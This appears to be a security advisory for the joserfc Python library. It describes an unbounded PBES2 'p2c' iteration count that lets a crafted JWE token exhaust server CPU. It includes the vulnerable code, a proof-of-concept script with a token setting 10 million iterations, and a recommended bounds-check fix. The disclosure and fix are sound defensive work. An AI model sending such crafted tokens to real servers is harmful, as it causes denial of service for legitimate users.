summary: "joserfc's PBES2 p2c Unbounded Iteration Count enables Denial of Service (DoS)\n# Summary\
  \ \n\nA resource exhaustion vulnerability in joserfc allows an unauthenticated attacker to\
  \ cause a Denial of Service (DoS) via CPU exhaustion. When the library decrypts a JSON Web\
  \ Encryption (JWE) token using Password-Based Encryption (PBES2) algorithms, it reads the\
  \ p2c (PBES2 Count) parameter directly from the token's protected header. This parameter defines\
  \ the number of iterations for the PBKDF2 key derivation function. Because joserfc does not\
  \ validate or bound this value, an attacker can specify an extremely large iteration count\
  \ (e.g., 2^31 - 1), forcing the server to expend massive CPU resources processing a single\
  \ token.\n\nThis vulnerability exists at the JWA layer and impacts all high-level JWE and\
  \ JWT decryption interfaces if PBES2 algorithms are allowed by the application's policy.\n\
  \n## Details\n \n**Vulnerable file:** `src/joserfc/_rfc7518/jwe_algs.py`\n**Vulnerable function:**\
  \ `PBES2HSAlgKeyEncryption.decrypt_cek()` \n**Lines:** 283\n\n```python\ndef decrypt_cek(self,\
  \ recipient: Recipient[OctKey]) -> bytes:\n    headers = recipient.headers()\n    # ...\n\
  \    p2c = headers[\"p2c\"]  # ← attacker-controlled integer\n    # ...\n    kek = self.compute_derived_key(key.get_op_key(\"\
  deriveKey\"), p2s, p2c)\n```\nThe `p2c` value is then passed to `compute_derived_key` : \n\
  \n```python\ndef compute_derived_key(self, key: bytes, p2s: bytes, p2c: int) -> bytes:\n \
  \   # ...\n    kdf = PBKDF2HMAC(\n        algorithm=self.hash_alg,\n        length=self.key_size\
  \ // 8,\n        salt=salt,\n        iterations=p2c,  # ← unbounded iterations\n        backend=default_backend(),\n\
  \    )\n```\n\n**Impact on JWT Policies**\nAny JWT policy configured to allow PBES2 key management\
  \ algorithms (e.g., `PBES2-HS256+A128KW`) is vulnerable. Because the DoS occurs during the\
  \ decryption phase, the attack is triggered before any claim validation (e.g., \nexp,`iss,\
  \ aud` checks) or nested signature verification takes place. This makes existing JWT \"policies\"\
  \ ineffective as a defense if the underlying algorithm is permitted.\n\n\n## PoC\n\n**Tested\
  \ against joserfc 1.6.2.\nLocal Reproduction:**\n\n```python\nimport time\nfrom joserfc import\
  \ jwe\nfrom joserfc.jwk import OctKey\n\n# Force joserfc to use local source if needed\n#\
  \ sys.path.insert(0, \"src\")\n\n# Attacker-crafted token with 10 million iterations\n# Normally\
  \ legitimate p2c is ~2048-4096. 10M iterations = ~5s DoS.\ntoken = \"eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiWjI5dVpYSm1ZdyIsInAyYyI6MTAwMDAwMDB9.dummy.dummy.dummy.dummy\"\
  \n\nkey = OctKey.import_key(b\"any-password\")\n\nt0 = time.perf_counter()\ntry:\n    # This\
  \ call will hang the thread for seconds\n    jwe.decrypt_compact(token, key, algorithms=[\"\
  PBES2-HS256+A128KW\", \"A128CBC-HS256\"])\nexcept Exception:\n    pass\nprint(f\"Elapsed:\
  \ {time.perf_counter() - t0:.2f}s\")\n```\n\n## Impact\nAn unauthenticated remote attacker\
  \ can exhaust the CPU resources of a server by sending a small number of crafted JWE/JWT tokens.\
  \ Each token will occupy a worker thread/process for a duration proportional to the `p2c`\
  \ value (up to several minutes or hours depending on the integer value). This results in a\
  \ complete Denial of Service for legitimate users.\n\n## Recommendation\nMinimal fix: Implement\
  \ an upper bound check for the `p2c` parameter in `PBES2HSAlgKeyEncryption.decrypt_cek()`.\n\
  \n```python\nMAX_P2C = 300000  # Example security bound\n\n# ... inside decrypt_cek ...\n\
  p2c = headers[\"p2c\"]\nif not isinstance(p2c, int) or p2c > MAX_P2C:\n    raise DecodeError(f\"\
  p2c iteration count too high (max {MAX_P2C})\")\n```\nAdditionally, applications should only\
  \ enable PBES2 algorithms if password-based encryption is specifically required and should\
  \ enforce a strict  algorithms allowlist in their JWT/JWE policies."
